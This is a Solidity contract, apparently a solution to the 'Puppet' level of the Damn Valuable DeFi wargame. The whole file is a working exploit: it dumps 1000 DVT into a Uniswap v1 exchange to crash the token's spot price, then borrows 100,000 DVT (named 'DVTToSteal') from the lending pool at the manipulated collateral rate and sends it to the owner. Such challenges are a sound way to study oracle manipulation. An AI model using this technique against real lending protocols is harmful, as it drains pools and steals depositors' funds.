//SPDX-License-Identifier:UNLICENSED

pragma solidity ^0.8.0;

import "./PuppetPool.sol";
import "../DamnValuableBase/DamnValuableToken.sol";
import "./Interfaces/IUniswapExchange.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract AttackPuppet is Ownable{

    PuppetPool pool;
    DamnValuableToken damnToken;
    IUniswapExchange uniswapPair;

    uint DVTAmountInPool = 10 ether;
    uint etherInPool = 10 ether;
    uint DVTToSwap = 1000 ether;
    uint DVTToSteal = 100000 ether;

    event ETHBought(uint amount);


    constructor(address _pool, address _damnToken, address _uniswapPair){
        pool = PuppetPool(_pool);
        damnToken = DamnValuableToken(_damnToken);
        uniswapPair = IUniswapExchange(_uniswapPair);
    }



    function callSwap()public onlyOwner{

        damnToken.approve(address(uniswapPair), damnToken.balanceOf(address(this)));

        uint amountETHBack = uniswapPair.tokenToEthSwapInput(
            DVTToSwap,
            1,
            block.timestamp
        );

        emit ETHBought(amountETHBack);

        uint amountEthToSpend = pool.calculateDepositRequired(DVTToSteal);
        pool.borrow{value:amountEthToSpend}(DVTToSteal, owner());
    }



    receive()external payable{}
}
